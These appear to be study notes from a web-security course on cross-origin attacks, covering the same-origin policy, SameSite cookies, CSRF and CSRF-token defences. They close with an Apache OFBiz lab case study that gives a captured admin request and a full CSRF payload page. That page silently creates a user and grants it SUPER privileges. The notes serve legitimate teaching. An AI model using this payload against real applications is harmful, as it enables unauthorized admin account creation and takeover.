
#### Same-Origin Policy (SOP)

- Same Origin Policy or SOP is used to block `JAVASCRIPT` from being executed from external resources, however this still allows images
- No Payloads in this section - for full explanation browse to [[6.1 - 6.1.2 Same-Origin Policy]]

An origin is the combination of a protocol, hostname, and port number. Browsers enforce a same-origin policy to prevent one origin from accessing resources (images, HTML, data, JSON, etc.) on a different origin.
In other words, SOP allows images, IFrames, and other resources to be loaded onto the page, while blocking the JavaScript engine from accessing the contents of a response.
This is functionally similar to the _HttpOnly_[1](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/same-origin-policy-31314/accessing-the-cors-sandbox-31007#fn-local_id_111-1) cookie flag, which prevents JavaScript from accessing the cookie, but allows the browser to send it with HTTP requests.

-----
#### Same Site Cookies
Google Chrome was the first browser to support the _SameSite_[1](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/samesite-cookies-31306/samesite-cookies-31399#fn-local_id_236-1) attribute when it was first introduced in 2016, but all major browsers now support it. This attribute instructs browsers on how to handle a cookie on cross-site, or cross-origin, requests. A cross-site request occurs when one site initiates a request to a different site. For example, if `megacorpone.com` were to load an image from kali.org, a browser would consider the request cross-site.

There are three valid settings for this attribute. The first setting is _None_. This instructs the browser to send the cookie on any relevant request, regardless of where or how that request originated. Some browsers will block a cookie with _SameSite=None_ if the _Secure_ flag is not also set.

The second setting is _Lax_. This value instructs the browser not to send the cookie on cross-site requests. However, the browser will send the cookie during navigation when a user manually enters the URL in the browser or clicks a link to the site.

The final setting is _Strict_. When this value is set, a browser will only include the cookie if the domain originating the request is the same as the cookie's domain. The key difference from _Lax_ is that browsers do not send _Strict_ cookies when following links from other domains.

If a web application does not set the _SameSite_ flag on a cookie, it is up to the browser to determine how to handle the cookie. Google Chrome treats any cookie without a valid _SameSite_ attribute as _SameSite=Lax_. While other browsers have indicated they will eventually follow suit, they have not done so yet.


----------

#### CSRF

Cross-site Request Forgery was a staple in the _OWASP Top 10_,[1](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/samesite-cookies-31306/samesite-cookies-31399#fn-local_id_237-1) but it was dropped from the 2017 version due to browsers implementing new defensive controls as well as many frameworks including CSRF protections.[2](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/samesite-cookies-31306/samesite-cookies-31399#fn-local_id_237-2) In a CSRF exploit, an attacker tricks a user into submitting a request to a site where the user already has an active, authenticated session.

Attackers can phish the victim directly or inject malicious content into a web application, which the victim then loads. In either case, the CSRF payload forces the victim's browser, which includes any session cookies, to make a request to the web application. This browser behavior is changing, which we will discuss later on. Unless the web application has CSRF mitigations, it cannot differentiate between normal requests and malicious requests. The web application then executes the malicious request in the victim's session.

The most dangerous part of CSRF vulnerabilities is that any site that is visited could make these requests, assuming the user is authenticated and the browser will send the cookies to the target application. An attacker could target a specific user with a phishing attack to then launch a CSRF attack or compromise a website to launch CSRF attacks against any user visiting the site. Alternatively, a user could unintentionally visit a malicious site by browsing the internet.

The exact nature of what a CSRF vulnerability can do depends on the web application. Some examples include transferring money in a banking application, creating a new user (potentially including administrative users), or changing passwords to facilitate account takeover.

----
#### Detecting and Preventing CSRF
Until the widespread adoption of _SameSite_ cookies, web applications are vulnerable to CSRF unless they specifically mitigate it. This is unlike other vulnerabilities that occur because of coding flaws. In other words, CSRF attacks exploit the default behavior of browsers and web applications, so it is up to an application to prevent the vulnerability. This is why we will discuss finding CSRF vulnerabilities and how to prevent them at the same time.

Applications can prevent CSRF attacks by requiring the user to submit an additional unique value to prove they are the one initiating the request. This cannot be just a cookie because browsers will automatically send cookies to the domain that created them. One common approach is to include a token or nonce, sometimes referred to as a CSRF token, as a hidden input field. The application randomly generates the value of this token per page or per session and specific to one user. A web application can confirm that a user intentionally sent a request by validating this CSRF token. If the token is missing or invalid, the application should not continue processing the request. This approach requires the application to track the relationship between users and their CSRF tokens.

However, having a server keep track of every CSRF token for every request can add overhead and usability concerns. For this reason, developers have created unique solutions where the server doesn't have to keep track of the token. While a CSRF token cookie by itself is not secure, with additional mitigating factors, it could be a good option.

There are two approaches that rely on a CSRF token cookie where browsers submit the value of the cookie in another way. The "cookie to header" approach uses client-side JavaScript to send the value as a request header. If the cookie value and request header value match on a request, the application can consider the request valid. This approach can be problematic as it requires JavaScript to gain access to the value in the first place. If JavaScript can access the cookie, a _cross-site scripting_ (XSS) vulnerability could allow an attacker to gain access to the cookie and bypass the CSRF protection.

Cross-site scripting vulnerabilities can bypass CSRF protections in an application since any requests generated by the XSS payload are considered part of the domain. In other words, the requests generated from an XSS payload are not considered cross-origin or cross-site and can therefore access hidden form values or include cookies on requests.

-------------
The "double submit" approach uses a hidden input field that contains the CSRF token value. Similar to the "cookie to header" approach, the web application can validate the cookie value matches in the input field value. One benefit of this approach is that JavaScript does not need access to the cookie containing the CSRF token. Additionally, the web application does not need to maintain a list of which tokens it has generated. It simply validates the values on any given request match.

If an application contains form elements that do not include these mitigations or use _SameSite_ cookies, it is vulnerable to CSRF. We should therefore inspect the HTML source in our browser or requests in Burp Suite to determine if any controls exist.

Let's consider the following hypothetical form.

A sample form without CSRF protection:
```html
<form action="/user/changePassword" method="post">
    <div class="form-group">
        <label for="password1">Password</label>
        <input type="password" class="form-control" id="password1" name="password1" required>
    </div>
    <div class="form-group">
        <label for="password2">Repeat Password</label>
        <input type="password" class="form-control" id="password2" name="password2" required>
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
</form>
```

<form action="/user/changePassword" method="post">
    <div class="form-group">
        <label for="password1">Password</label>
        <input type="password" class="form-control" id="password1" name="password1" required>
    </div>
    <div class="form-group">
        <label for="password2">Repeat Password</label>
        <input type="password" class="form-control" id="password2" name="password2" required>
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
</form>

A sample form with CSRF protection
- Notice the `"hidden"` field
```html
<form action="/user/changePassword" method="post">
    <div class="form-group">
        <input type="hidden" name="csrftoken" value="SXQncyBhIHNlY3JldCB0byBldmVyeWJvZHkh" />
        <label for="password1">Password</label>
        <input type="password" class="form-control" id="password1" name="password1" required >
    </div>
    <div class="form-group">
        <label for="password2">Repeat Password</label>
        <input type="password" class="form-control" id="password2" name="password2" required>
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
</form>
```

<form action="/user/changePassword" method="post">
    <div class="form-group">
        <input type="hidden" name="csrftoken" value="SXQncyBhIHNlY3JldCB0byBldmVyeWJvZHkh" />
        <label for="password1">Password</label>
        <input type="password" class="form-control" id="password1" name="password1" required >
    </div>
    <div class="form-group">
        <label for="password2">Repeat Password</label>
        <input type="password" class="form-control" id="password2" name="password2" required>
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
</form>


The HTML form now includes a hidden input field named "csrftoken". The metaphorical web application would use this value to determine that a user intentionally submitted this request. The input field containing the token can be named anything, but most frameworks or middleware tend to include "csrf" and "token" somewhere in the name.


--------
#### Exploiting CSRF

Generally, it is easier to exploit CSRF with GET requests as there are several ways to instruct a browser to send a GET request. One example is to place the URL that will execute the CSRF attack in an image tag. A browser will send a GET request for image tags. In a CSRF attack, we only care that the victim's browser sends the request with the CSRF payload. Even if the browser cannot render the response, the target web application should handle the request and perform the associated functionality. In such cases, attackers can leverage simple content injection vulnerabilities to create persistent CSRF attacks that target all users of the application via HTML tags that are essentially invisible, such as images or iFrames with no size.

Sending a POST request can be more difficult. We would need to trick the user into loading an HTML form that uses JavaScript to submit itself on the _load_ event. This approach also restricts what content-types and HTTP methods we can use. For example, an HTML form cannot send JSON data natively. Standard HTML forms can only send GET and POST requests.

JavaScript APIs, such as _XMLHttpRequest_[1](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/cross-site-request-forgery-csrf-31298/detecting-and-preventing-csrf-30999#fn-local_id_258-1) (XHR) and Fetch, can send requests with arbitrary HTTP methods and content-types. However, when used in this way, these APIs will send a _preflight_[2](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/cross-site-request-forgery-csrf-31298/detecting-and-preventing-csrf-30999#fn-local_id_258-2) request to determine if Cross-Origin Resource Sharing (CORS) is enabled on the target server. We will discuss CORS later.

--------
#### Case-Study Apache OFbiz

- For full walkthrough navigate to notes [[6.4 - 6.4.4 Case Study - Apache OFBiz]]
- Essentially this walks us through logging in as an `admin` account to the `OFbiz` application, the creation of a new user named `test` as well as shows that there are no `CSRF`  exploit mitigations in place in the `POST` request that is sent to add the `test` user to the `super` group

```http
POST /webtools/control/addUserLoginToSecurityGroup HTTP/1.1
Host: ofbiz:8443
Cookie: JSESSIONID=0E8428C000456CB64C11353D294E78F4.jvm1; OFBiz.Visitor=10000
Content-Length: 80
Cache-Control: max-age=0
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: https://ofbiz:8443
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ofbiz:8443/webtools/control/EditSecurityGroupUserLogins?groupId=SUPER
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

**groupId=SUPER&userLoginId=test&fromDate_i18n=&fromDate=&thruDate_i18n=&thruDate=**
```


#### Revising the CSRF payload

- full payload `ofbiz2.html` that defines variables, creates the user, and adds the user to the `SUPER` group - this payload is sent right after logging in as admin so a new fresh `JSESSION` cookie is seen in the request.

Script Combined into `ofbiz2.html` and saved into `/var/www/html/`
```js
<html>
<head>
<script>
  // Define variables
  var username = "csrftest2";
  var password = "password";
  var host = "https://ofbiz:8443";
  var create_url = "/webtools/control/createUserLogin";
  var admin_url = "/webtools/control/userLogin_addUserLoginToSecurityGroup";
  var create_params = "enabled=&partyId=&userLoginId=" + username + "&currentPassword=" + password + "&currentPasswordVerify=" + password + "&passwordHint=hint&requirePasswordChange=N&externalAuthId=&securityQuestion=&securityAnswer=";
  var admin_params = "userLoginId=" + username + "&partyId=&groupId=SUPER&fromDate_i18n=&fromDate=&thruDate_i18n=&thruDate=";

  // Function to create user
  function send_create() { 
    console.log("Creating user..."); 
    fetch(host + create_url, {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body : create_params
    }).then(function(response) {
      send_admin();
    }); 
  }

  // Function to add admin role
  function send_admin() { 
    console.log("Adding admin role..."); 
    fetch(host + admin_url, {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body : admin_params
    }).then(
      console.log("Should be done...") 
    );
  }

  // Call the create function to start the process
  send_create();
</script>
</head>
<body></body>
</html>
```